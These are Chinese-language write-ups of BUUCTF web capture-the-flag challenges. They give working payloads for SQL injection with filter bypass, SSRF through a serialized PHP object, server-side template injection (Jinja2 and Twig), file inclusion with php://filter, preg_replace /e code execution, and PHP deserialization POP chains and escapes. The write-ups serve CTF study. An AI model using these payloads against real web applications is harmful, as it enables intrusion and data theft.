# BUUCTF easy java writeup

关于WEB-INF相关知识>>查看web笔记

点击help:

提示:`java.io.FileNotFoundException:{help.docx}`

**漏洞形成原因：**

Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。

Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录（请注意这里，是通过Nginx，而不是Tomcat访问到的，因为上面已经说到，Tomcat是禁止访问这个目录的。）。


**漏洞利用方式：**

直接在域名后面加上WEB-INF/web.xml就可以了。
根据web.xml配置文件路径或通常开发时常用框架命名习惯，找到其他配置文件或类文件路径。
dump class文件进行反编译。

简单来说：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。


构造payload

`http://c19e9cb9-584f-4cc5-a9ac-02344a7f60f5.node4.buuoj.cn:81/Download?filename=WEB-INF/web.xml`

一定要用burp抓包之后把GET改成POST才可以访问成功

发送到重放器观察到com.wm.ctf.FlagController

这个意思应该是com/wm/ctf/FlagController.class

web-inf所有class文件都在classes目录下

构造payload:

`POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class`

拿到文件源码,找到里面的base64 flag



# buuctf fakebook

随便注册一个账号发现账号有超链接,点开之后发现no存在注入点

注入之后发现data列以序列化的形式存储

通过报错发现网站根目录应该是/var/www/html/

用dirsearch扫描发现robots.txt文件,访问后发现有一个user.php.bak

里面有关于userinfo相关代码

下载之后发现存在curl_exec()函数,判断存在SSRF漏洞,可以进行文件读取



因为注入点为2也就是username,所以data应该是第四列

```
<?php
class UserInfo{
    public $name = "123";
    public $age = 11;
    public $blog = "file:///var/www/html/flag.php";
}
$aaa = new UserInfo();
$bbb = serialize($aaa);
echo $bbb;
?>
```

最终payload:

`?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}';#`

execute之后查看源代码发现iframe标签访问之后在源码中得到flag



# buuctf the secret of ip

知识点:

- XFF注入
- **Flask**可能存在**Jinjia2模版注入漏洞**
	**PHP**可能存在**Twig模版注入漏洞**



X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。

根据题目提示,猜测可能是XFF注入

使用burp抓包之后添加:

`X-Forward-For:1`

发现ip地址变成1说明是XFF注入

在此处尝试sql注入失败.

此处是模板注入漏洞,添加模板算式,检测是否可以执行:

`X-Forwarded-For: {{7*7}}`

`X-Forwarded-For: {{system('ls')}}`

发现可以执行,利用命令拿到flag



# buuctf had a bad day

打开返现?category=woffers

尝试sql注入失败

随便改成?category=flag.php

发现是include(),文件包含漏洞

想到可以使用伪协议

使用php://filter/read=convert.base64-encode/index/resource=index

读取源码

发现php代码,解读发现payload必须包含woofers,meowers或index

尝试把flag写入payload中

构造payload:

?category=woffers/../flag

/../在url中表示上级目录的意思



# buuctf ZJCTF 不过如此

拿到next.php源码后

```
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
```

preg_place /e模式下会把替换的内容当成php代码执行

构造payload:

/next.php?\S*=\${phpinfo()}

可以执行(我也不知道phpinfo为什么要用\${}括起来)

其中\S*表示正则表达式匹配所有非空

构造payload:

/next.php?\S*=\${getFlag()}&cmd=system('ls');   #不加;无法执行



# buuctf Cookie is so stable

hint.php页面的源码中有提示,突破口在cookie

这里的知识点是利用服务端模板注入攻击。[SSTI](https://so.csdn.net/so/search?q=SSTI&spm=1001.2101.3001.7020)里面的Twig攻击



输入{{7*‘7’}}，返回49表示是 Twig 模块

输入{{7*‘7’}}，返回7777777表示是 Jinja2 模块

这里在cookie处进行判断

user={{7*‘7’}},查看返回值



所以这个模板注入是Twig注入

这里注意要在PHPSESSID后user前加上;分隔开



# buuctf Ezpop

知识点:pop链构造

Welcome to index.php
<?php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);//这里的include函数，可以让我们来进行php伪协议，这里是第一个突破口。
    }
    public function __invoke(){//调用函数的方式调用一个对象时的回应方法
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){//在一个对象被当作一个字符串使用时调用，当echo一个对象时会自动触发这个方法。
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {//使用了黑名单过滤了一下http协议的东西，但是不影响咱们的php伪协议。
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;//get方法用来返回$function,然后$function的值是$this->p，这里将Modifier成为了函数
        return $function();
    }
}

if(isset($_GET['pop'])){//get方法传参pop，然后反序列化
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

思路

1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发__get()魔术方法
将Modifier这个类变成一个函数，从而调用__invoke()方法，进而调用include()函数

2.让source 等于对象，进而触发__toString方法(**preg_match中就把source当作字符串,所以会触发**)，输出内容

**urlencode是因为protected是私有属性**

不同属性的对象序列化后字符格式是不一样的

Private属性 ： 数据类型:属性名长度:"\00类名\00属性名";数据类型:属性值长度:"属性值";

Protected属性 ： 数据类型:属性名长度:"\00*\00属性名";数据类型:属性值长度:"属性值";

 可以看到有\00如果直接输出的话会被直接省略



# buuctf easy_serialize_php



`$_SESSION["user"] = 'guest';`
`$_SESSION['function'] = 'a';`
`$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php base64编码`
`var_dump(serialize($_SESSION));`



得到输出:

`"a:3:{s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"`

此时就可以对user和function的值就行修改实现php反序列化逃逸

原理:

- 序列化字符串以`;}"`结尾,可以操控

- flag等关键字过滤掉后对格式造成改变

- php特性,当序列化一合法,就会立即抛弃后面部分

具体实现:

首先修改function的值进行尝试修改:

`$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'`

再在后面加上一个键值对,目的是为了让序列化合法化丢弃后面部分

`$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"b";}'`

此时序列化结果如下:

`a:3:{s:4:"user";s:5:"guest";s:8:"function";s:58:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"b";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`

再对user进行更改:

user的值肯定要改成全是flag或者php的格式,其长度有后面部分决定,目的是为了把`";s:8:"function";s:58:"a`全都包括进来,所以长度应该是24,

那么就可以凑出user的值,此处可以是`flagflagflagflagflagflag`

此时就可以构造payload:

`_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"b";s:1:"a";}&_SESSION[user]=flagflagflagflagflagflag`



# buuctf 高明的黑客

访问**/www.tar.gz**,下载源码

发现有无数php文件

不可能找过去,

打开其中几个发现有很多shell

猜测可能有成功的shell于是编写脚本(buuctf高明的黑客.py)



# buuctf Shrine

给出了一个python源码,可以看出是flask框架

源码中有两个路由，其中还有`/shrine/`路径，简单测试是否存在模版注入：`/shrine/{{2+2}}`

补充:路由传参只要再url后加上**/[路由名字]/[传入数据]**即可

- 首先`replace()`会将`()`替换为空
- 其中黑名单处理会将单独的`config`和`self`替换为`None`

若不存在黑名单，可以使用`{{self.__dict__}}`读取，通过查阅资料，Python的沙箱逃逸可以利用Python对象之间的引用关系来调用被禁用的函数对象，其中有两个函数包含了current_app
全局变量，也就是：url_for()和get_flashed_messages()

payload:

`/shrine/{{url_for.__globals__}}`

`/shrine/{{url_for.__globals__['current_app'].config}}`

`/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}`     #在其中搜索flag



# buuctf unicorn shop

直接尝试购买最贵的独角兽

报错:Only one char(?) allowed!     #只允许一个字符

题目提示unicode,去compart搜索比1337大的unicode码

搜索栏输入two thousand搜索,随便复制一个即可

购买最贵的独角兽,得到flag



# buuctf web1

发现广告申请页面存在注入点,手动fuzz以下发现过滤了or,注释符和空格

`/**/`代替空格

`-1'union/**/select/**/1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

发现有22列,并且2,3有回显

因为or被过滤,所以只能用`mysql.innodb_table_stats`查询表名

`1'/**/union/**/select/**/1,(select(group_concat(table_name))from(mysql.innodb_table_stats)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

#查询表名

此时无法知道列名,使用无列名注入

 无列名注入爆字段

(select group_concat(a,b,c) from (select 1 as a,2 as b,3 as c union select * from users) as d)

当返回`Operand should contain 1 column(s)`说明列数一致

`1'/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)/**/as/**/ d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

`1'/**/union/**/select/**/1,(select/**/concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)d/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

拿到flag

